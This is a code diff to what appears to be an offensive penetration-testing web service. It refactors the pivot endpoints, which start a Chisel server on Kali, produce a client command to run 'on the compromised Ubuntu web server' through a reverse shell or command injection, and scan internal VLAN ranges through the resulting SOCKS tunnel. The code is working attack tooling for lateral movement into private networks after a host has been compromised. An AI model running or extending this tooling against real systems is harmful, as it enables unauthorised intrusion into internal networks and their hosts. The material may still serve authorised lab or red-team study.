@@ -58,8 +58,8 @@ def pivot_setup():
     to deploy on the compromised web server.
     """
     data = request.get_json(silent=True) or {}
-    chisel_port = int(data.get("chisel_port", 8080))
-    socks_port = int(data.get("socks_port", 1080))
+    chisel_port = int(data.get("chisel_port", Config.PIVOT_DEFAULT_CHISEL_PORT))
+    socks_port = int(data.get("socks_port", Config.PIVOT_DEFAULT_SOCKS_PORT))
     platform = data.get("platform", "linux")
     target_ip = data.get("target_ip", Config.KALI_IP)
 
@@ -85,18 +85,12 @@ def pivot_setup():
         "socks_proxy": f"127.0.0.1:{socks_port}",
         "client_command": client_cmd,
         "instructions": [
-            "1. Chisel server is now running on Kali",
-            "2. Run the client command ON THE COMPROMISED WEB SERVER",
-            "   via the reverse shell or command injection",
-            "3. The client will connect back and create a SOCKS tunnel",
-            "4. All proxychains traffic will route through the tunnel",
+            "1. Chisel server is listening on Kali",
+            "2. Run the generated command on the compromised Ubuntu web server",
+            "3. Wait until /pivot/status reports socks_ready=true",
+            "4. Internal scans will then route through the project-local ProxyChains file",
         ],
-        "internal_ranges": [
-            "10.10.10.0/24 (ADMIN VLAN)",
-            "10.10.20.0/24 (USERS VLAN)",
-            "172.16.0.0/24 (EXTERNAL FW)",
-            "172.16.1.0/24 (INTERNAL FW)",
-        ],
+        "internal_ranges": Config.PIVOT_INTERNAL_RANGES,
     })
 
 
@@ -119,17 +113,18 @@ def pivot_scan():
     Common targets: 10.10.10.0/24 (ADMIN), 10.10.20.0/24 (USERS).
     """
     data = request.get_json(silent=True) or {}
-    target_range = data.get("range", "10.10.20.0/24")
+    target_range = data.get("range") or (Config.PIVOT_INTERNAL_RANGES[0] if Config.PIVOT_INTERNAL_RANGES else "10.10.20.0/24")
     ports = data.get("ports", "21,22,80,445,3389,5985,5986")
     timeout = int(data.get("timeout", 60))
 
     engine = get_pivot_engine()
 
-    if not engine.is_running:
+    if not engine.is_socks_ready():
         return jsonify({
             "ok": False,
-            "error": "Pivot is not active. Run /pivot/setup first.",
-        }), 400
+            "error": "Pivot server may be running, but the Ubuntu Chisel client has not created the SOCKS tunnel yet.",
+            "pivot": engine.get_status(),
+        }), 409
 
     results = engine.scan_network(target_range, ports=ports, timeout=timeout)
 
